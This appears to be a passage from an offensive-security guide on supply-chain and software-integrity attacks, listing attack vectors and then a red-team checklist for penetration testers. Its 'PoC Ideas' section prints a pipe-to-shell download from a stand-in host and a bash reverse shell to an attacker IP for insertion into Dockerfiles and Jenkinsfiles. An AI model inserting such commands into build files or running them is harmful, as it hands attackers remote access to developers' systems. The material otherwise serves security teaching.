---

### 🚨 What Are Exploitation Vectors?

These are specific avenues an attacker uses to manipulate software integrity or inject unauthorized data/code that compromises the system's behavior, security, or trustworthiness.

---

## ⚔️ 1. **CI/CD Pipeline Compromise**

* **Attack Vector:** Poisoning the Continuous Integration/Continuous Deployment (CI/CD) pipeline by injecting malicious dependencies, scripts, or modifying build scripts.
* **Targets:**

  * GitHub Actions / GitLab CI files
  * Jenkins scripts (`Jenkinsfile`)
* **Real Example:**

  * Attacker submits a pull request with a hidden backdoor in a `.yaml` file executed during builds.

---

## ⚔️ 2. **Dependency Confusion / Substitution**

* **Attack Vector:** Uploading a malicious package to a public repository with the same name as an internal dependency.
* **Targets:**

  * `npm`, `PyPI`, `RubyGems`, `NuGet`, etc.
* **Tactic:**

  * Exploit developer systems or CI tools that prioritize public registry over internal one.

---

## ⚔️ 3. **Malicious Package Injection**

* **Attack Vector:** Trojanizing widely used libraries or slipping malware into low-maintenance packages.
* **Case Study:**

  * `event-stream` NPM package included malicious logic targeting `copay` wallet.

---

## ⚔️ 4. **Unsigned or Improperly Signed Updates**

* **Attack Vector:** Delivering tampered updates in absence of proper signature verification.
* **Scenario:**

  * Applications that auto-update from a server without validating digital signatures can be forced to download malware.

---

## ⚔️ 5. **CDN Hijacking or Manipulation**

* **Attack Vector:** Injecting malicious scripts or altering resources delivered via third-party CDNs.
* **Common Targets:**

  * JS libraries like jQuery, Bootstrap loaded externally.
* **Risk:**

  * Attacker compromises the CDN or DNS to serve tampered files.

---

## ⚔️ 6. **Infrastructure-as-Code (IaC) Poisoning**

* **Attack Vector:** Modifying Terraform, Ansible, or CloudFormation scripts to include:

  * Hidden user creation
  * Opening ports
  * Inserting malicious shell scripts
* **Example:**

  * An attacker hides a reverse shell in Terraform user-data for EC2.

---

## ⚔️ 7. **Script Injections in Packaging/Build Files**

* **Attack Vector:** Altering `setup.py`, `package.json`, or `.spec` files to include post-install scripts that execute on deployment.
* **Result:**

  * Remote code execution when unsuspecting developers install or build the app.

---

## ⚔️ 8. **Tampering with Docker Images**

* **Attack Vector:** Hosting backdoored Docker images on public registries (`hub.docker.com`) with misleading tags.
* **Goal:**

  * Get devs to pull malicious base images.

---

## ⚔️ 9. **Manipulating Configuration or ENV Variables**

* **Attack Vector:** Injecting sensitive keys, credentials, or altering environment variables to change app behavior.
* **Use Case:**

  * Altering `ENV=development` to expose verbose error messages or debug interfaces.

---

## ⚔️ 10. **Backdoored Binaries & Compilers**

* **Attack Vector:** Supply-chain compromise where compilers or interpreters themselves are trojanized (Ref: Ken Thompson’s "Trusting Trust").
* **Effect:**

  * Any compiled code is inherently compromised regardless of source code audit.

---

### 🧠 Offensive Mindset Tips

* **Analyze CI/CD scripts** for hidden logic.
* **Pull public images/packages**, reverse engineer, and compare checksums.
* **Scan IaC files** for hardcoded secrets, open access, or malicious automation.
* **Exploit package manager behavior** (e.g., install order, default registries).
* **Use MITM on insecure update mechanisms** to inject tampered data.

---

### 🧪 PoC Ideas:

* Create a **malicious npm package** mimicking an internal name (`acme-utils`).
* Inject reverse shell logic in `.postinstall` script.
* Poison Dockerfiles with `wget http://evil.sh | sh`.
* Modify a `Jenkinsfile` to include `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`.

* 🔐 Test whether the update signature validation is **enforced or just present**.
* 📜 Always analyze **build scripts, Jenkinsfiles**, and Dockerfiles for untrusted fetch/install commands.
* 🧬 Use SBOM tools to **map and manipulate** vulnerable components in the software supply chain.

---

### 🧪 Lab Environment Ideas

* Simulate a CI/CD pipeline and inject malicious bash scripts via pull request.
* Create a fake NPM package and show how it can be downloaded during automated builds.
* Modify a JAR file, recompile with malicious class, and analyze validation bypass.

✅ **Chapter 8: Offensive Security Checklist for Software and Data Integrity Failures – Deep Dive**

This chapter provides an offensive red team-style checklist tailored to help penetration testers, bug bounty hunters, and ethical hackers identify and exploit software and data integrity failures. These failures often lead to supply chain compromise, unauthorized code execution, or manipulation of critical configurations/data.

---

### 🧪 1. **CI/CD Pipeline & Deployment Chain Abuse**

* 🔍 Is the CI/CD pipeline accessible or exposed publicly?
* 🛠️ Are secrets (API keys, tokens) hardcoded in build scripts or YAML files (e.g., `.gitlab-ci.yml`, `Jenkinsfile`)?
* ⚠️ Can you intercept or tamper with artifacts (e.g., `.jar`, `.war`, `.tar`, `.zip`) during build or delivery?
* 🔁 Are there unvalidated webhook calls between repositories and deployment servers?
* ⛓️ Is software being pulled from unauthenticated third-party sources (e.g., unverified GitHub repos)?

---

### 📦 2. **Package & Dependency Tampering**

* 🧬 Are third-party dependencies signed or verified (GPG, SHA256)?
* 🪤 Can you introduce malicious packages via typosquatting or dependency confusion?
* 📤 Are private/internal packages misconfigured to fetch from public registries?
* ❌ Is there a lack of validation for package versions (e.g., using `*`, `latest`, `>=`)?
* 🔥 Is `pip`, `npm`, `maven`, or another package manager downloading packages over HTTP?

---

### 🧾 3. **Unsigned or Unverified Binaries/Scripts**

* 🧱 Is the system executing unsigned binaries/scripts during boot or runtime?
* 🗂️ Are initialization files (`init.d`, `systemd`, `.bashrc`, `.bash_profile`) modifiable by lower-privileged users?
* 👤 Can untrusted users drop scripts into auto-executed paths (e.g., `/etc/profile.d`, `/usr/local/bin`)?
* ⚙️ Are there misconfigured cron jobs or scheduled tasks executing from insecure paths?

---

### 🔐 4. **Improper Digital Signature Handling**

* ❌ Is digital signature verification implemented but not enforced?
* 💀 Can you bypass validation logic (e.g., accept broken or self-signed signatures)?
* 🔄 Is rollback protection absent in software updates?
* 🧩 Can you inject malicious updates into the app update mechanism?

---

### 🧬 5. **Insecure Configuration Storage or Delivery**

* 📥 Are configuration files transferred without encryption (FTP, SCP without keys, SMB v1)?
* 🏷️ Are secrets stored in plaintext in `.env`, `config.json`, `settings.py`, etc.?
* 🧻 Are default credentials or secrets committed to version control?
* 🐚 Can configuration tampering lead to insecure behaviors (e.g., debug mode on in production)?

---

### 💣 6. **Code Repository Abuse**

* 🔎 Can `.git`, `.svn`, or `.hg` directories be accessed from the web?
* 🧪 Are secrets or passwords hardcoded and left in commit history?
* 📁 Is the `.gitignore` file misconfigured to expose sensitive paths?
* 👥 Are repository collaborators overprivileged or unverified?

---

### 🌐 7. **Web Hooks, Update URLs, and Signed App Attacks**

* 🌍 Are application update URLs served over HTTP?
* 📡 Are webhook endpoints unauthenticated or have weak tokens?
* 🧨 Can you poison the update server via DNS hijacking or cache poisoning?
* 🔁 Is the update system vulnerable to downgrade attacks?

---

### 🛠️ 8. **Supply Chain Attack Simulation**

* 🧫 Can you simulate a compromise of a public dependency with malicious behavior?
* 🎯 Are internal dev teams pulling dependencies directly without validation?
* 📦 Can you upload a trojanized version of a private/internal dependency to a public registry?

---

### 🧪 9. **Malicious Plugin or Module Injection**

* ⚙️ Are plugin directories writable by web or application users?
* 🔧 Can you inject unauthorized plugins/extensions into apps like WordPress, Jenkins, or VSCode?
* 🪟 Are outdated modules/plugins being used that allow RCE or privilege escalation?

---

### 🔄 10. **Rollback & Downgrade Attacks**

* 🔻 Can you downgrade the application to a vulnerable version?
* 🧱 Is there no validation for software versions during update?
* 💉 Are update files or installers cached locally and can be overwritten?

---

### 🧰 Pro Tips for Red Teamers

* Use tools like **SigThief**, **Binwalk**, **YARA**, **Gitleaks**, **Dependency-Track**, **Syft**, and **Grype** to enumerate and validate software integrity issues.
* Clone private CI/CD pipelines (using SSRF or exposed SCM hooks) to modify the delivery chain.
* Chain software/data integrity flaws with LFI, RCE, or privilege escalation bugs for maximum impact.
